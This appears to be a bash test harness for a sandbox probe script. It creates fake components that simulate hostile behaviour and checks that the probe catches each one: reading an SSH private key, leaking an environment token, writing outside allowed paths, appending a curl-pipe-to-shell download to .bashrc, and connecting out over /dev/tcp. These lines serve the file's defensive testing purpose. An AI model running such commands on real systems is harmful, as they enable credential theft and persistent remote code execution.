#!/usr/bin/env bash
# Test harness for probe.sh: harmless fake components, each run under one grant.
# Usage: test_probe.sh <path-to-probe.sh>   (Linux/WSL2; needs bwrap, strace)
# Expect: all PASS. Exit code of each probe is checked: 0 within scope, 3 out of scope, 2 failed start.
# Test 6b waits ~120 s (the probe timeout) on a connect to 192.0.2.1, a reserved address nothing answers.
set -u
PROBE="$1"
F="$HOME/probe-test/fixtures"
rm -rf "$HOME/probe-test"; mkdir -p "$F"

mk() { mkdir -p "$F/$1"; printf '%s\n' "$2" > "$F/$1/run.sh"; }
mk good    'echo hello > /out/result.txt'
mk steal   'cat "$HOME/.ssh/id_rsa"'
mk envleak 'echo "token is $CANARY_TOKEN"'
mk escape  'echo x > /work/evil.txt; echo x > /home/probe/evil.txt; echo ok > /out/fine.txt'
mk persist 'echo "curl http://example.invalid/x | sh" >> "$HOME/.bashrc"'
mk net     'echo > /dev/tcp/192.0.2.1/443'   # bash built-in: no extra program
mk exec    '/bin/ls / > /dev/null'

PASS=0; FAILN=0
check() { # name expected got
  if [ "$3" = "$2" ]; then echo ">>> TEST PASS ($1)"; PASS=$((PASS+1))
  else echo ">>> TEST FAIL ($1): exit $3, wanted $2"; FAILN=$((FAILN+1)); fi
}
t() { # name capability expected-exit fixture [extra args]
  local name="$1" cap="$2" want="$3" fx="$4"; shift 4
  echo; echo "======== $name  (grant: $cap, expect exit $want)"
  bash "$PROBE" -c "$cap" -t "$F/$fx" "$@" -- ${SHELLCMD:-/bin/sh} /work/run.sh
  check "$name" "$want" $?
}

echo "======== 0 sandbox failure must not pass  (expect exit 2)"
bash "$PROBE" -c baseline -t "$F/good" -- /nonexistent/program
check "0 failed start" 2 $?

t "1 good write"        fs-write 0 good
t "2 steal ssh key"     fs-read  3 steal
t "3 env token leak"    baseline 3 envleak
t "4 write escape"      fs-write 3 escape
t "5 bashrc persist"    fs-write 3 persist
SHELLCMD=/bin/bash t "6a net, no grant"    baseline 3 net
SHELLCMD=/bin/bash t "6b net, granted"     net-out  0 net -a example.com
t "7a exec, no grant"   baseline 3 exec
t "7b exec, granted"    exec     0 exec
SHELLCMD=sh t "8 bare command name" fs-write 0 good
echo; echo "== SUMMARY: $PASS passed, $FAILN failed"
